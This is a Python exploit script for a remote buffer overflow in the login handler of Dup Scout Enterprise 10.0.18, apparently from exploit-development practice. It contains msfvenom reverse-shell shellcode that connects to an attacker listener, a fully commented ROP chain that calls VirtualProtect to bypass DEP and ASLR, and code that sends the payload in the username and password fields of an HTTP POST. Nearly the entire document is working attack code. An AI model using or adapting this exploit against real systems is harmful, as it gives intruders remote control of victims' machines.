# Dup Scount Enterprise 10.0.18 'Login' Remote Buffer Overflow with ASLR/DEP Bypass
# kernel32!VirtualProtect
# Author: Connor McGarr (@33y0re)

import socket, os, struct, sys

# msfvenom -p windows/shell_reverse_tcp LHOST=172.16.55.169 LPORT=443 -b "\x00\x0a\x0d\x25\x26\x2b\x3d" -f py -v shellcode
shellcode =  ""
shellcode += "\xda\xc6\xd9\x74\x24\xf4\xba\xd5\x6a\x13\xa8"
shellcode += "\x58\x33\xc9\xb1\x52\x83\xe8\xfc\x31\x50\x13"
shellcode += "\x03\x85\x79\xf1\x5d\xd9\x96\x77\x9d\x21\x67"
shellcode += "\x18\x17\xc4\x56\x18\x43\x8d\xc9\xa8\x07\xc3"
shellcode += "\xe5\x43\x45\xf7\x7e\x21\x42\xf8\x37\x8c\xb4"
shellcode += "\x37\xc7\xbd\x85\x56\x4b\xbc\xd9\xb8\x72\x0f"
shellcode += "\x2c\xb9\xb3\x72\xdd\xeb\x6c\xf8\x70\x1b\x18"
shellcode += "\xb4\x48\x90\x52\x58\xc9\x45\x22\x5b\xf8\xd8"
shellcode += "\x38\x02\xda\xdb\xed\x3e\x53\xc3\xf2\x7b\x2d"
shellcode += "\x78\xc0\xf0\xac\xa8\x18\xf8\x03\x95\x94\x0b"
shellcode += "\x5d\xd2\x13\xf4\x28\x2a\x60\x89\x2a\xe9\x1a"
shellcode += "\x55\xbe\xe9\xbd\x1e\x18\xd5\x3c\xf2\xff\x9e"
shellcode += "\x33\xbf\x74\xf8\x57\x3e\x58\x73\x63\xcb\x5f"
shellcode += "\x53\xe5\x8f\x7b\x77\xad\x54\xe5\x2e\x0b\x3a"
shellcode += "\x1a\x30\xf4\xe3\xbe\x3b\x19\xf7\xb2\x66\x76"
shellcode += "\x34\xff\x98\x86\x52\x88\xeb\xb4\xfd\x22\x63"
shellcode += "\xf5\x76\xed\x74\xfa\xac\x49\xea\x05\x4f\xaa"
shellcode += "\x23\xc2\x1b\xfa\x5b\xe3\x23\x91\x9b\x0c\xf6"
shellcode += "\x36\xcb\xa2\xa9\xf6\xbb\x02\x1a\x9f\xd1\x8c"
shellcode += "\x45\xbf\xda\x46\xee\x2a\x21\x01\xbd\xbb\x1e"
shellcode += "\x78\xd5\xb9\x60\x7b\x9d\x37\x86\x11\xf1\x11"
shellcode += "\x11\x8e\x68\x38\xe9\x2f\x74\x96\x94\x70\xfe"
shellcode += "\x15\x69\x3e\xf7\x50\x79\xd7\xf7\x2e\x23\x7e"
shellcode += "\x07\x85\x4b\x1c\x9a\x42\x8b\x6b\x87\xdc\xdc"
shellcode += "\x3c\x79\x15\x88\xd0\x20\x8f\xae\x28\xb4\xe8"
shellcode += "\x6a\xf7\x05\xf6\x73\x7a\x31\xdc\x63\x42\xba"
shellcode += "\x58\xd7\x1a\xed\x36\x81\xdc\x47\xf9\x7b\xb7"
shellcode += "\x34\x53\xeb\x4e\x77\x64\x6d\x4f\x52\x12\x91"
shellcode += "\xfe\x0b\x63\xae\xcf\xdb\x63\xd7\x2d\x7c\x8b"
shellcode += "\x02\xf6\x8c\xc6\x0e\x5f\x05\x8f\xdb\xdd\x48"
shellcode += "\x30\x36\x21\x75\xb3\xb2\xda\x82\xab\xb7\xdf"
shellcode += "\xcf\x6b\x24\x92\x40\x1e\x4a\x01\x60\x0b"

# Offset to EIP = 780
crash = "\x41" * 780

# Return to the stack
crash += struct.pack('<L', 0x10011208)			# ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x90909090)			# ROP chain starts @ ESP + 4. Padding to compensate

# Begin ROP chain. In muts we trust.

# Preserve a stack address into EAX and ECX
crash += struct.pack('<L', 0x101291b1)			# pop edx ; sub al, 0x5B ; ret: libspp.dll (non-ASLR enabled module) (Load any writable address into EDX due to the future arbitrary write gadget mov dword [edx], ecx)
crash += struct.pack('<L', 0x101d5030)			# Writable address from .data section of libspp.dll (Will be manipulated to point to a return to the stack gadget)
crash += struct.pack('<L', 0x100cd67c)			# push esp ; mov dword [esi+0x04], 0x00000001 ; mov eax, esi ; pop esi ; ret: libspp.dll (non-ASLR enabled module) (Save ESP into ESI)
crash += struct.pack('<L', 0x100b1712)			# mov eax, esi ; pop esi ; ret: libspp.dll (non-ASLR enabled module) (Save ESP into EAX only)
crash += struct.pack('<L', 0x90909090)			# Compensation for pop esi
crash += struct.pack('<L', 0x1016629c)			# pop ecx ; ret: libspp.dll (non-ASLR enabled module) (Load ECX with an add esp, 0x8 ; ret gadget to compensate for future call dowrd [edx] gadget)
crash += struct.pack('<L', 0x1013acab)			# add esp, 0x04; ret: libspp.dll (non-ASLR enabled module) (Jump over call dowrd [edx]'s return address on the stack to reach next gadget after mov ecx, eax ; call dword [edx])
crash += struct.pack('<L', 0x1014c421)			# mov dword [edx], ecx ; pop ebx ; ret: libspp.dll (non-ASLR enabled module) (Use arbitrary write to load return to stack gadget, add esp 0x8 ; ret, into EDX via a pointer)
crash += struct.pack('<L', 0x90909090)			# Compensate for pop ebx in above ROP gadget
crash += struct.pack('<L', 0x10034088)			# mov ecx, eax ; call dword [edx]: libspp.dll (non-ASLR enabled module) (ESP is saved into EAX and ECX)

# Jump over kernel32!VirtualProtect parameter placeholders
crash += struct.pack('<L', 0x1009a181)			# add esp, 0x18 ; ret: libspp.dll (non-ASLR enabled module)

# kernel32!VirtualProtect parameter placeholders
crash += struct.pack('<L', 0x10168060)			# Pointer to kernel32!CreateFileA (no pointers from IAT directly to kernel32!VirtualProtect)
crash += struct.pack('<L', 0x11111111)			# Return address parameter placeholder
crash += struct.pack('<L', 0x22222222)			# lpAddress (Start of shellcode)
crash += struct.pack('<L', 0x33333333)			# dwSize (Size of shellcode)
crash += struct.pack('<L', 0x44444444)			# flNewProtect (RWX = 0x40)
crash += struct.pack('<L', 0x101d5030)			# lpflOldProtect (Any writable location- previously used writable address from arbitrary write gadget)

# Place shellcode location in EAX
crash += struct.pack('<L', 0x10109380)			# pop ebp ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0xfffffdb0)			# Distance between EAX and shellcode location, negatively represented
crash += struct.pack('<L', 0x1014c168)			# sub eax, ebp ; pop esi ; pop ebp ; pop ebx ; ret: libspp.dll (non-ASLR enabled module) (Place shellcode location in EAX)
crash += struct.pack('<L', 0x90909090)			# Compensation for pop esi in above ROP gadget
crash += struct.pack('<L', 0x90909090)			# Compensation for pop ebp in above ROP gadget
crash += struct.pack('<L', 0x90909090)			# Compensation for pop ebx in above ROP gadget

# Point return placeholder to shellcode location (ECX currently is 0x24 bytes away from return parameter placeholder. Arbitrary write gadget writes at ECX + 0x4, where ECX contains the parameter placeholder. Placing parameter placeholder - 0x4 in ECX to compensate)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10130f1e)			# mov dword [ecx+0x04], eax ; ret: libspp.dll (non-ASLR enabled module) (Point return parameter placeholder to shellcode location)

# Point lpAddress placeholder to shellcode location (ECX currently is 0x8 bytes away from lpAddress parameter placeholder. Arbitrary write gadget writes at ECX + 0x4, where ECX contains the parameter placeholder. Placing parameter placeholder - 0x4 in ECX to compensate. Add 0x4 to ECX instead of 0x8)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10130f1e)			# mov dword [ecx+0x04], eax ; ret: libspp.dll (non-ASLR enabled module) (Point lpAddress parameter placeholder to shellcode location)

# Calculate dwSize and overwrite parameter placeholder (Done with shellcode address in EAX now. Shellcode will be 0x200/513 bytes) (ECX currently is 0x8 bytes away from dwSize parameter placeholder. Arbitrary write gadget writes at ECX + 0x4, where ECX contains the parameter placeholder. Placing parameter placeholder - 0x4 in ECX to compensate. Add 0x4 to ECX instead of 0x8)
crash += struct.pack('<L', 0x1012b413)			# pop eax ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0xfffffdff)			# 0x201 negatively represented
crash += struct.pack('<L', 0x10061cbd)			# neg eax ; ret: libspp.dll (non-ASLR enabled module) (Place 0x201 into EAX)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10130f1e)			# mov dword [ecx+0x04], eax ; ret: libspp.dll (non-ASLR enabled module) (Point dwSize parameter placeholder to value in EAx)

# Calculate flNewProtect and overwrite parameter placeholder (0x40 = RWX) (ECX currently is 0x8 bytes away from flNewProtect parameter placeholder. Arbitrary write gadget writes at ECX + 0x4, where ECX contains the parameter placeholder. Placing parameter placeholder - 0x4 in ECX to compensate. Add 0x4 to ECX instead of 0x8)
crash += struct.pack('<L', 0x1012b413)			# pop eax ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0xffffffc0)			# 0x40 negatively represented
crash += struct.pack('<L', 0x10061cbd)			# neg eax ; ret: libspp.dll (non-ASLR enabled module) (Place 0x201 into EAX)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10130f1e)			# mov dword [ecx+0x04], eax ; ret: libspp.dll (non-ASLR enabled module) (Point flNewProtect parameter placeholder to value in EAX)

# Extract pointer to kernel32!VirtualProtect (ECX is 0xC bytes in front of kernel32!VirtualProtect parameter placeholder)
crash += struct.pack('<L', 0x100fcd73)			# dec ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100fcd73)			# dec ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100fcd73)			# dec ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100fcd73)			# dec ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100fcd73)			# dec ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100fcd73)			# dec ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100fcd73)			# dec ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100fcd73)			# dec ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100fcd73)			# dec ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100fcd73)			# dec ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100fcd73)			# dec ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100fcd73)			# dec ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x1014c9a1)			# mov eax ; ecx ; ret: libspp.dll (non-ASLR enabled module) (Copy ECX into EAX. Must dereference parameter placeholder to get pointer to kernel32, while also preserving the stack address the holds the parameter placeholder for the arbitrary write gadget )
crash += struct.pack('<L', 0x1014dc4c)			# mov eax, dword ptr [eax] ; ret: libspp.dll (non-ASLR enabled module) (Dereference parameter placholder to get the libspp.dll IAT entry that points to kernel32!CreateFileA)
crash += struct.pack('<L', 0x1014dc4c)			# mov eax, dword ptr [eax] ; ret: libspp.dll (non-ASLR enabled modlue) (Dereference libspp.dll IAT entry to extract pointer to kernel32.dll)
crash += struct.pack('<L', 0x10109380)			# pop ebp ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0xfffb3437)			# kernel32!CreateFileA is 0xfffb3437 away from kernel32!VirtualProtect.
crash += struct.pack('<L', 0x100faa33)			# add eax, ebp ; aaa ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10109380)			# pop ebp ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0xffffff30)			# EAX is 0xffffff30 (negative 0xd0) away from kernel32!VirtualProtect.
crash += struct.pack('<L', 0x1014c168)			# sub eax, ebp ; pop esi ; pop ebp ; pop ebx ; ret: libspp.dll (non-ASLR enabled module) (Place shellcode location in EAX)
crash += struct.pack('<L', 0x90909090)			# Compensation for pop esi in above ROP gadget
crash += struct.pack('<L', 0x90909090)			# Compensation for pop ebp in above ROP gadget
crash += struct.pack('<L', 0x90909090)			# Compensation for pop ebx in above ROP gadget
crash += struct.pack('<L', 0x100fcd73)			# dec ecx ; ret: libspp.dll (non-ASLR enabled module) (Set ECX to kernel32!VirtualProtect parameter placeholder - 0x4)
crash += struct.pack('<L', 0x100fcd73)			# dec ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100fcd73)			# dec ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100fcd73)			# dec ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10130f1e)			# mov dword [ecx+0x04], eax ; ret: libspp.dll (non-ASLR enabled module) (Point kernel32!VirtualProtect parameter placeholder to kernel32!VirtualProtect)

# Place stack address that points to kernel32!VirtualProtect (kernel32!VirtualProtect parameter placeholder address) into ESP
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module) (ECX already pointed to the stack address - 0x4. Increasing by 0x4)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1d11)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x1014c9a1)			# mov eax ; ecx ; ret: libspp.dll (non-ASLR enabled module) (Copy address into EAX)
crash += struct.pack('<L', 0x10144265)			# xchg eax, esp ; ret: libspp.dll (non-ASLR enabled module) (Kick off call to kernel32!VirtualProtect)

# Arbitrary amount of NOPs
crash += "\x90" * 250

# Shellcode
crash += shellcode

# Make sure the application crashes
crash += "\x90" * (10000 - len(crash))

evil =  "POST /login HTTP/1.1\r\n"
evil += "Host: 192.168.228.140\r\n"
evil += "User-Agent: Mozilla/5.0\r\n"
evil += "Connection: close\r\n"
evil += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
evil += "Accept-Language: en-us,en;q=0.5\r\n"
evil += "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
evil += "Keep-Alive: 300\r\n"
evil += "Proxy-Connection: keep-alive\r\n"
evil += "Content-Type: application/x-www-form-urlencoded\r\n"
evil += "Content-Length: 17000\r\n\r\n"
evil += "username=" + crash
evil += "&password=" + crash + "\r\n"

print "[+] Sending exploit..."
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.142", 80))
s.send(evil)
s.close()
